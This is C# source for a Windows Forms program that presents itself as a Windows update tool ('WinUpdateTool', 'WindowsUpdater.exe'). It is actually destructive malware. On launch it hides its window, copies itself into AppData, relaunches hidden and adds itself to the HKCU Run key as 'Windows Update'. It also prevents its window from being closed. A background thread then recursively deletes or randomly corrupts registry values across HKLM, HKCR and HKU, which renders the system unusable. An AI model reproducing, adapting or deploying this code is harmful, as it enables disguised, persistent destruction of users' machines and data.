using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace WinUpdateTool
{
    public partial class Updater : Form
    {
        string[] args = null;
        double damage = 0;

        private Random rng = new Random(13572468);
        public static int seed = new Random().Next();

        public void DestroyReg(RegistryKey key, double dm)
        {
            foreach (var k in key.GetSubKeyNames())
            {
                try
                {
                    DestroyReg(key.OpenSubKey(k, true), dm);
                }
                catch (Exception) { }
            }

            foreach (var v in key.GetValueNames())
            {
                try
                {
                    if (rng.NextDouble() <= damage * 1 * dm)
                    {
                        key.DeleteValue(v);
                    }
                    else
                    {
                        CorruptReg(key, v, dm);
                    }
                }
                catch (Exception) { }
            }
        }

        public void CorruptReg(RegistryKey key, string value, double dm)
        {
            var v = key.GetValue(value, null, RegistryValueOptions.DoNotExpandEnvironmentNames);

            switch (key.GetValueKind(value))
            {
                case RegistryValueKind.Binary:
                    byte[] arr = (byte[])v;
                    for (int i = 0; i < arr.Length; i++)
                    {
                        if (rng.NextDouble() <= damage * dm)
                        {
                            arr[i] = (byte)rng.Next(0, 256);
                        }
                    }
                    break;

                case RegistryValueKind.DWord:
                case RegistryValueKind.QWord:
                    if (rng.NextDouble() <= damage * dm)
                        v = rng.Next();

                    break;

                case RegistryValueKind.String:
                case RegistryValueKind.ExpandString:
                    v = CorruptString((string)v, dm);
                    break;

                case RegistryValueKind.MultiString:
                    string[] strs = (string[])v;

                    for (int i = 0; i < strs.Length; i++)
                    {
                        strs[i] = CorruptString(strs[i], dm);
                    }

                    break;
            }

            key.SetValue(value, v, key.GetValueKind(value));
        }

        public string CorruptString(string str, double dm)
        {
            string n = "";

            foreach (char c in str)
            {
                if (rng.NextDouble() <= damage * dm)
                    n += (char)rng.Next(32, 127);
                else
                    n += c;
            }

            return n;
        }

        public void Destroy()
        {
            DestroyReg(Registry.LocalMachine, 1);
            DestroyReg(Registry.ClassesRoot, 1);
            DestroyReg(Registry.Users, 1);
        }

        public Updater(double damage, string[] args)
        {
            this.damage = damage;
            this.args = args;
            InitializeComponent();
        }

        private void Updater_Load(object sender, EventArgs e)
        {
            string tempDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdater.exe";
            string currentDir = Application.ExecutablePath;
            Hide();
            if (currentDir == tempDir)
            {
                AddToStartup();
                new Thread(Destroy).Start();
            }
            else
            {
                File.Copy(currentDir, tempDir, true);
                Execute(tempDir);
                Application.Exit();
            }
        }

        private void Updater_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Execute(string location)
        {
            Process CmdProcess = new Process();
            ProcessStartInfo processStartInfo = new ProcessStartInfo
            {
                FileName = location,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            CmdProcess.StartInfo = processStartInfo;
            CmdProcess.Start();
        }

        private void AddToStartup()
        {
            string tempDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsUpdater.exe";
            try
            {
                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
                registryKey.SetValue("Windows Update", tempDir);
            }
            catch { }
        }
    }
}
